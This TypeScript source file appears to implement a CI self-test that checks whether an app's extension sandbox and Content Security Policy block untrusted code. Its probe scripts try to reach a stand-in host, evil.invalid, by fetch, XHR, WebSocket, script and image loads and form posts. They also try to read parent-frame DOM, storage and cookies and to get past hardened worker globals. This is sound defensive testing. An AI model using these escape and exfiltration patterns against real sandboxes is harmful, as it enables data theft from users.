/**
 * L3 native extension self-test (CI only).
 * Gate: the env var SOMNIA_EXT_SELFTEST=<out.json> must be set AND the build must include the `ext-selftest` cargo feature
 * (see docs/extensions/14-native-selftest.md). Production builds never read the variable.
 * A probe extension runs inside the REAL packaged app, through the REAL somnia-ext:// scheme and prod CSP, and reports what happened.
 * This module is pure: the app supplies the ports (start worker, mount panel, navigate, write file, exit).
 */
export const SELFTEST_ENV = 'SOMNIA_EXT_SELFTEST';
export const PROBE_EXTENSION_ID = 'somnia.selftest.probe';
export const SELFTEST_SCHEMA = 1;

export interface Violation {directive: string; blocked: string}
export interface ProbeReport {
  started: boolean;            // probe code executed (worker bootstrap + eval worked / panel inline script ran)
  api_roundtrip: boolean;      // somnia.project.listFiles() answered by the host
  network_blocked: boolean;    // every network attempt was refused AND produced a CSP violation
  dom_blocked: boolean;        // panel only: parent/top DOM + storage unreachable (n/a = true for workers)
  attempts: Record<string, 'blocked' | 'open' | 'unreported'>;
  violations: Violation[];
  evalWorks?: boolean;         // worker only
  error?: string;
}
export interface NavReport {
  targets: Record<string, {navigated: boolean; api_after_navigation_denied: boolean}>;
}
export interface SelftestReport {
  schema: number; platform: string; app_version: string; csp_mode: 'prod'; started_at: string;
  worker: ProbeReport | null; panel: ProbeReport | null; navigation: NavReport | null;
  failures: string[]; ok: boolean;
}

/** Shared probe body. `net` is the list of attempt names to run; runs in a worker (no DOM) or a panel (DOM). */
const COMMON = (evil: string) => `
const __v=[];const __h=(e)=>__v.push({directive:String(e.effectiveDirective||e.violatedDirective),blocked:String(e.blockedURI)});
(self.document||self).addEventListener('securitypolicyviolation',__h);
const __wait=(ms)=>new Promise(r=>setTimeout(r,ms));
const __attempt=async(name,fn)=>{const before=__v.length;let threw=false;try{await Promise.race([Promise.resolve().then(fn),__wait(1500).then(()=>{throw new Error('timeout')})]);}catch(e){threw=true;}
 await __wait(150);const hit=__v.length>before;return [name,hit?'blocked':(threw?'unreported':'open')];};
const EVIL=${JSON.stringify(evil)};
`;

const NET_ATTEMPTS_WORKER = `
const attempts=Object.fromEntries(await Promise.all([]));
for(const [k,fn] of [
 ['fetch',()=>(self.WorkerGlobalScope?WorkerGlobalScope.prototype.fetch:fetch).call(self,EVIL+'/fetch')],
 ['xhr',()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open('GET',EVIL+'/xhr');x.onload=()=>res(1);x.onerror=()=>rej(new Error('xhr'));x.send();})],
 ['websocket',()=>new Promise((res,rej)=>{const w=new WebSocket('wss://'+EVIL.replace(/^https?:\\/\\//,'')+'/ws');w.onopen=()=>res(1);w.onerror=()=>rej(new Error('ws'));})],
 ['importScripts',()=>importScripts(EVIL+'/is.js')],
]){const [n,r]=await __attempt(k,fn);attempts[n]=r;}`;

/** Full worker source with NO hardening, so only CSP can stop the network. Posts {type:'probe.report'}. */
export const RAW_WORKER_PROBE = (evil: string) => `'use strict';(async()=>{${COMMON(evil)}
let evalWorks=false;try{evalWorks=new Function('return 6*7')()===42;}catch(e){}
${NET_ATTEMPTS_WORKER}
await __wait(200);
postMessage({type:'probe.report',started:true,evalWorks,attempts,violations:__v,network_blocked:Object.values(attempts).every(v=>v==='blocked'),api_roundtrip:false,dom_blocked:true});})();`;

/**
 * Activation code for the probe extension in the REAL worker bootstrap (hardened globals removed).
 * It bypasses the best-effort hardening via WorkerGlobalScope.prototype so the CSP is what is under test.
 * The result is returned through a registered command's notify so no extra channel is needed: somnia.ui.notify(JSON).
 */
export const PROBE_EXTENSION_CODE = (evil: string) => `${COMMON(evil).replace("(self.document||self).addEventListener","self.addEventListener")}
const files=await somnia.project.listFiles();
let evalWorks=false;try{evalWorks=(await (async()=>42)())===42;}catch(e){}
${NET_ATTEMPTS_WORKER.replace("importScripts(EVIL+'/is.js')","self.importScripts?self.importScripts(EVIL+'/is.js'):Promise.reject(new Error('removed'))")}
await __wait(200);
const report={started:true,evalWorks,api_roundtrip:Array.isArray(files),attempts,violations:__v,network_blocked:Object.values(attempts).every(v=>v==='blocked'),dom_blocked:true};
await somnia.commands.register('${PROBE_EXTENSION_ID}.report',async()=>{await somnia.ui.notify('SELFTEST_REPORT '+JSON.stringify(report));});
await somnia.ui.notify('SELFTEST_REPORT '+JSON.stringify(report));`;

/** Inline script for the panel document. Uses window.somnia in the app, window.__call in the Playwright harness. */
export const PANEL_PROBE_SCRIPT = (evil: string) => `(async()=>{${COMMON(evil).replace("const EVIL","var EVIL")}
const call=()=>typeof somnia!=='undefined'?somnia.project.listFiles():window.__call('project.listFiles',[]);
const attempts={};
const run=async(k,fn)=>{const [n,r]=await __attempt(k,fn);attempts[n]=r;};
await run('fetch',()=>fetch(EVIL+'/fetch'));
await run('xhr',()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open('GET',EVIL+'/xhr');x.onload=()=>res(1);x.onerror=()=>rej(new Error('x'));x.send();}));
await run('websocket',()=>new Promise((res,rej)=>{const w=new WebSocket('wss://'+EVIL.replace(/^https?:\\/\\//,'')+'/ws');w.onopen=()=>res(1);w.onerror=()=>rej(new Error('ws'));}));
await run('img',()=>new Promise((res,rej)=>{const i=new Image();i.onload=()=>res(1);i.onerror=()=>rej(new Error('img'));i.src=EVIL+'/img.png';}));
// Form posts are stopped by the iframe sandbox (no allow-forms) before CSP form-action, so no violation event is expected; the evil-host hit counter is the proof.
await run('formSubmit',()=>{const f=document.createElement('form');f.action=EVIL+'/form';f.method='post';document.body.appendChild(f);f.submit();return new Promise((_,rej)=>setTimeout(()=>rej(new Error('nav')),50));});
await run('base',()=>{const b=document.createElement('base');b.href=EVIL+'/';document.head.appendChild(b);return Promise.reject(new Error('n/a'));});
await run('scriptSrc',()=>new Promise((res,rej)=>{const s=document.createElement('script');s.src=EVIL+'/s.js';s.onload=()=>res(1);s.onerror=()=>rej(new Error('s'));document.head.appendChild(s);}));
let dom_blocked=true;
for(const f of [()=>parent.document.title,()=>top.document.title,()=>localStorage.length,()=>document.cookie.length&&sessionStorage.length]){try{f();dom_blocked=false;}catch(e){}}
let api_roundtrip=false;try{const l=await call();api_roundtrip=Array.isArray(l);}catch(e){}
await __wait(200);
parent.postMessage({type:'probe.report',started:true,api_roundtrip,dom_blocked,attempts,violations:__v,network_blocked:Object.entries(attempts).every(([k,v])=>k==='formSubmit'?v!=='open':v==='blocked')},'*');})();`;

/** Violations that are not caused by a deliberate probe attempt mean the product itself is being blocked (e.g. inline bridge). */
export function unexpectedViolations(r: ProbeReport, evilHost: string): Violation[] {
  return r.violations.filter(v => !v.blocked.includes(evilHost) && !/^(inline|eval)$/.test('') && !(v.directive === 'base-uri') && !(v.directive === 'form-action'));
}

export function evaluateReport(r: SelftestReport | Omit<SelftestReport, 'failures' | 'ok'>, evilHost = 'evil.invalid'): string[] {
  const f: string[] = [];
  const chk = (who: 'worker' | 'panel', p: ProbeReport | null) => {
    if (!p) { f.push(`${who}: no report`); return; }
    if (!p.started) f.push(`${who}: probe did not start${p.error ? ' (' + p.error + ')' : ''}`);
    if (!p.api_roundtrip) f.push(`${who}: API round trip failed`);
    if (!p.network_blocked) f.push(`${who}: network not fully blocked ${JSON.stringify(p.attempts)}`);
    if (!p.dom_blocked) f.push(`${who}: DOM/storage reachable`);
    for (const [k, v] of Object.entries(p.attempts)) if (v === 'open') f.push(`${who}: ${k} reached the network`);
    const stray = p.violations.filter(v => !v.blocked.includes(evilHost));
    // Policy violations whose target is not the probe's evil host: 'inline'/'eval' mean the product code was blocked.
    for (const v of stray) if (/^(inline|eval|blob|data|self)?$/.test(v.blocked) || v.blocked.startsWith('blob:') || v.blocked === 'inline' || v.blocked === 'eval') f.push(`${who}: product code blocked by CSP (${v.directive} ${v.blocked})`);
  };
  chk('worker', (r as SelftestReport).worker); chk('panel', (r as SelftestReport).panel);
  if ((r as SelftestReport).worker && (r as SelftestReport).worker!.evalWorks === false) f.push('worker: eval/AsyncFunction blocked');
  const nav = (r as SelftestReport).navigation;
  if (!nav) f.push('navigation: no report');
  else for (const [t, v] of Object.entries(nav.targets)) if (v.navigated && !v.api_after_navigation_denied) f.push(`navigation: panel kept host API authority after navigating to ${t}`);
  return f;
}

export interface SelftestPorts {
  platform: string; appVersion: string;
  runWorkerProbe(): Promise<ProbeReport>;
  runPanelProbe(): Promise<ProbeReport>;
  /** For each target, navigate the panel frame there, then try a host API call from the resulting document/window. */
  runNavigationProbe(targets: Record<string, string>): Promise<NavReport>;
  writeFile(path: string, content: string): Promise<void>;
  exit(code: number): void;
}
export const NAV_TARGETS = {
  'same-app': 'app-origin', 'scheme-doc': 'somnia-ext-other', 'redirect-chain': 'redirect-into-scheme', 'blob': 'blob', 'external-https': 'https://evil.invalid/',
} as const;

const withTimeout = <T,>(p: Promise<T>, ms: number, what: string) => Promise.race([p, new Promise<T>((_, rej) => setTimeout(() => rej(new Error(what + ' timed out')), ms))]);

/** Returns null when not enabled. Never throws; always writes the output file and exits 0 (all green) or 1. */
export async function runExtSelftest(env: Record<string, string | undefined>, ports: SelftestPorts, evilHost = 'evil.invalid'): Promise<SelftestReport | null> {
  const out = env[SELFTEST_ENV]; if (!out) return null;
  const started_at = new Date().toISOString();
  const guard = async <T,>(f: () => Promise<T>, what: string): Promise<T | null> => { try { return await withTimeout(f(), 20000, what); } catch { return null; } };
  const worker = await guard(() => ports.runWorkerProbe(), 'worker probe');
  const panel = await guard(() => ports.runPanelProbe(), 'panel probe');
  const navigation = await guard(() => ports.runNavigationProbe(NAV_TARGETS), 'navigation probe');
  const base = {schema: SELFTEST_SCHEMA, platform: ports.platform, app_version: ports.appVersion, csp_mode: 'prod' as const, started_at, worker, panel, navigation};
  const failures = evaluateReport(base, evilHost);
  const report: SelftestReport = {...base, failures, ok: failures.length === 0};
  try { await ports.writeFile(out, JSON.stringify(report, null, 2)); } catch { ports.exit(2); return report; }
  ports.exit(report.ok ? 0 : 1);
  return report;
}
